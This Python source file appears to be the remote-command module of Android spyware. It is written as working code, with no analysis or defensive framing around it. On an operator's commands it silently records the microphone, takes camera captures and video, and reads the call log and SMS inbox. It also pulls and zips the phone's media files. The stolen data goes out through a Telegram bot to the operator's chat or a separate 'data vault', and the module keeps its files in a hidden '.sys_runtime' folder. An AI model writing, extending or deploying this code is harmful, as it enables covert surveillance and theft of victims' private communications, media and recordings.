# -*- coding: utf-8 -*-

import os, time, json, zipfile, threading, logging, base64, random

from datetime import datetime

P = os.path.join(os.getcwd(), ".sys_runtime")

if not os.path.exists(P): os.makedirs(P)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR)

try:

    from jnius import autoclass

    JNI = True

except:

    JNI = False

class CommandHandler:

    def __init__(self):

        self.tmp = os.path.join(P, "ctmp")

        if not os.path.exists(self.tmp): os.makedirs(self.tmp)

    def _auth(self, tg, cid):

        return tg._auth(cid) if hasattr(tg, '_auth') else True

    def _battery_safe(self, monitor):

        try:

            bat, ch = monitor._bat() if hasattr(monitor, '_bat') else (50, False)

            return bat >= 80 or (ch and bat >= 40)

        except:

            return True

    def _zip_bin(self, files, zip_name):

        out = os.path.join(self.tmp, zip_name)

        try:

            with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:

                for f in files:

                    if os.path.exists(f):

                        z.write(f, os.path.basename(f) + '.bin')

            return out

        except:

            return None

    def _send_as_file(self, tg, cid, content, filename, parse_mode=None):

        path = os.path.join(self.tmp, filename)

        try:

            with open(path, 'w', encoding='utf-8') as f:

                f.write(content)

            with open(path, 'rb') as f:

                tg._ap("sendDocument", {"chat_id": cid, "caption": f"📄 {filename}"}, {"document": f})

        except:

            pass

        finally:

            if os.path.exists(path): os.remove(path)

    def _capture_audio(self, dur=10):

        if not JNI: return None

        mr = None

        try:

            MR = autoclass('android.media.MediaRecorder')

            out = os.path.join(self.tmp, f"a_{int(time.time())}.3gp")

            mr = MR()

            mr.setAudioSource(MR.AudioSource.MIC)

            mr.setOutputFormat(MR.OutputFormat.THREE_GPP)

            mr.setAudioEncoder(MR.AudioEncoder.AMR_NB)

            mr.setOutputFile(out)

            mr.prepare()

            mr.start()

            time.sleep(dur)

            mr.stop()

            return out

        except Exception as e:

            logging.error(str(e))

            return None

        finally:

            if mr: mr.release()

    def _call_log(self, limit=100):

        if not JNI: return "JNI unavailable"

        try:

            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()

            Uri = autoclass('android.net.Uri')

            cursor = resolver.query(Uri.parse("content://call_log/calls"), None, None, None, "date DESC")

            if not cursor: return "No permission"

            lines = []

            while cursor.moveToNext() and len(lines) < limit:

                name = cursor.getString(cursor.getColumnIndex("name")) or "Unknown"

                num = cursor.getString(cursor.getColumnIndex("number"))

                date = cursor.getLong(cursor.getColumnIndex("date"))

                lines.append(f"{name} ({num}) - {datetime.fromtimestamp(date/1000)}")

            cursor.close()

            return "\n".join(lines) if lines else "No calls"

        except: return "Error"

    def _sms_log(self, limit=100):

        if not JNI: return "JNI unavailable"

        try:

            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()

            Uri = autoclass('android.net.Uri')

            cursor = resolver.query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC")

            if not cursor: return "No permission"

            lines = []

            while cursor.moveToNext() and len(lines) < limit:

                addr = cursor.getString(cursor.getColumnIndex("address"))

                body = cursor.getString(cursor.getColumnIndex("body"))

                lines.append(f"From: {addr}\nBody: {body}\n---")

            cursor.close()

            return "\n".join(lines) if lines else "No SMS"

        except: return "Error"

    def _get_media_scanner(self, monitor):

        return getattr(monitor, 'media_scanner', None)

    def execute(self, cmd, tg, monitor, cid):

        if not self._auth(tg, cid):

            tg._ap("sendMessage", {"chat_id": cid, "text": "Session expired"})

            return

        threading.Thread(target=self._run, args=(cmd, tg, monitor, cid), daemon=True).start()

    def _run(self, cmd, tg, monitor, cid):

        parts = cmd.split("_")

        if len(parts) < 2:

            tg._ap("sendMessage", {"chat_id": cid, "text": "Invalid command"})

            return

        act = parts[0]

        did = parts[1] if len(parts) > 1 else ""

        if act == "cam":

            if not self._battery_safe(monitor):

                tg._ap("sendMessage", {"chat_id": cid, "text": "Battery too low for camera"})

                return

            if hasattr(monitor, 'camera_analyzer') and monitor.camera_analyzer:

                path = monitor.camera_analyzer.capture_now(silent=True)

                if path and os.path.exists(path):

                    with open(path, 'rb') as f:

                        tg._ap("sendPhoto", {"chat_id": cid}, {"photo": f})

                    os.remove(path)

                else:

                    tg._ap("sendMessage", {"chat_id": cid, "text": "Camera failed or busy"})

            else:

                tg._ap("sendMessage", {"chat_id": cid, "text": "Camera module not available"})

        elif act == "mic":

            p = self._capture_audio(10)

            if p:

                with open(p, 'rb') as f:

                    tg._ap("sendVoice", {"chat_id": cid}, {"voice": f})

                os.remove(p)

            else:

                tg._ap("sendMessage", {"chat_id": cid, "text": "Microphone failed"})

        elif act == "callog":

            txt = self._call_log(100)

            if len(txt) > 500:

                self._send_as_file(tg, cid, txt, f"calls_{did}.log")

            else:

                tg._ap("sendMessage", {"chat_id": cid, "text": txt})

        elif act == "sms":

            txt = self._sms_log(100)

            if len(txt) > 500:

                self._send_as_file(tg, cid, txt, f"sms_{did}.log")

            else:

                tg._ap("sendMessage", {"chat_id": cid, "text": txt})

        elif act == "hrv":

            if hasattr(monitor, 'daily_zipper') and monitor.daily_zipper:

                monitor.daily_zipper.run_now(force=True)

                tg._ap("sendMessage", {"chat_id": cid, "text": "Harvest forced"})

            else:

                tg._ap("sendMessage", {"chat_id": cid, "text": "No harvest module"})

        elif act == "str":

            if not self._battery_safe(monitor):

                tg._ap("sendMessage", {"chat_id": cid, "text": "Battery low for stream"})

                return

            if hasattr(monitor, 'stream_manager') and monitor.stream_manager:

                monitor.stream_manager.record_video(duration=15, callback=lambda path: self._send_file(tg, cid, path, monitor))

            else:

                tg._ap("sendMessage", {"chat_id": cid, "text": "Stream module missing"})

        elif act == "set" or act == "res":

            if len(parts) >= 3:

                res = parts[2]

                setattr(monitor, 'video_res', res)

                tg._ap("sendMessage", {"chat_id": cid, "text": f"Video resolution set to {res}p"})

            else:

                tg._ap("sendMessage", {"chat_id": cid, "text": "Usage: set_<device>_<res>"})

        elif act == "prev":

            if len(parts) >= 5:

                try:

                    _, dtyp, page, idx = parts[0], parts[1], parts[2], parts[3]

                    scanner = self._get_media_scanner(monitor)

                    if scanner:

                        thumb = scanner.get_thumbnail(did, dtyp, int(page), int(idx))

                        if thumb and os.path.exists(thumb):

                            with open(thumb, 'rb') as f:

                                tg._ap("sendPhoto", {"chat_id": cid}, {"photo": f})

                            os.remove(thumb)

                        else:

                            tg._ap("sendMessage", {"chat_id": cid, "text": "Preview failed"})

                    else:

                        tg._ap("sendMessage", {"chat_id": cid, "text": "Scanner missing"})

                except:

                    tg._ap("sendMessage", {"chat_id": cid, "text": "Invalid preview command"})

        elif act == "info":

            if len(parts) >= 5:

                try:

                    _, dtyp, page, idx = parts[0], parts[1], parts[2], parts[3]

                    scanner = self._get_media_scanner(monitor)

                    if scanner:

                        info = scanner.get_info(did, dtyp, int(page), int(idx))

                        tg._ap("sendMessage", {"chat_id": cid, "text": info[:4000]})

                    else:

                        tg._ap("sendMessage", {"chat_id": cid, "text": "Scanner missing"})

                except:

                    tg._ap("sendMessage", {"chat_id": cid, "text": "Invalid info command"})

        elif act == "down":

            if len(parts) >= 5:

                try:

                    _, dtyp, page, idx = parts[0], parts[1], parts[2], parts[3]

                    scanner = self._get_media_scanner(monitor)

                    if scanner:

                        orig = scanner.get_original(did, dtyp, int(page), int(idx))

                        if orig and os.path.exists(orig):

                            vault = getattr(monitor, 'vlt', None)

                            chat = vault if vault else cid

                            with open(orig, 'rb') as f:

                                tg._ap("sendDocument", {"chat_id": chat}, {"document": f})

                            tg._ap("sendMessage", {"chat_id": cid, "text": f"File sent to {'data vault' if vault else 'here'}"})

                        else:

                            tg._ap("sendMessage", {"chat_id": cid, "text": "File not found"})

                    else:

                        tg._ap("sendMessage", {"chat_id": cid, "text": "Scanner missing"})

                except:

                    tg._ap("sendMessage", {"chat_id": cid, "text": "Invalid download command"})

        elif act == "zipsel":

            if len(parts) >= 4:

                try:

                    _, dtyp, page = parts[0], parts[1], parts[2]

                    key = f"{did}_{dtyp}_{page}"

                    sel = getattr(monitor, 'selected_media', {}).get(key, [])

                    if not sel:

                        tg._ap("sendMessage", {"chat_id": cid, "text": "No items selected"})

                        return

                    scanner = self._get_media_scanner(monitor)

                    files = []

                    if scanner:

                        for idx in sel:

                            f = scanner.get_original(did, dtyp, int(page), int(idx))

                            if f and os.path.exists(f):

                                files.append(f)

                    if files:

                        zip_path = self._zip_bin(files, f"sel_{int(time.time())}.zip")

                        if zip_path:

                            vault = getattr(monitor, 'vlt', None)

                            chat = vault if vault else cid

                            with open(zip_path, 'rb') as z:

                                tg._ap("sendDocument", {"chat_id": chat}, {"document": z})

                            os.remove(zip_path)

                            tg._ap("sendMessage", {"chat_id": cid, "text": f"Zipped {len(files)} files sent to {'data vault' if vault else 'here'}"})

                        else:

                            tg._ap("sendMessage", {"chat_id": cid, "text": "Zipping failed"})

                    else:

                        tg._ap("sendMessage", {"chat_id": cid, "text": "No valid files"})

                except:

                    tg._ap("sendMessage", {"chat_id": cid, "text": "Invalid zip command"})

        else:

            tg._ap("sendMessage", {"chat_id": cid, "text": f"Unknown: {act}"})

    def _send_file(self, tg, cid, path, monitor):

        if path and os.path.exists(path):

            vault = getattr(monitor, 'vlt', None)

            chat = vault if vault else cid

            with open(path, 'rb') as f:

                tg._ap("sendDocument", {"chat_id": chat}, {"document": f})

            os.remove(path)

_handler = None

def execute(data, tg, monitor, cid):

    global _handler

    if _handler is None:

        _handler = CommandHandler()

    _handler.execute(data, tg, monitor, cid)
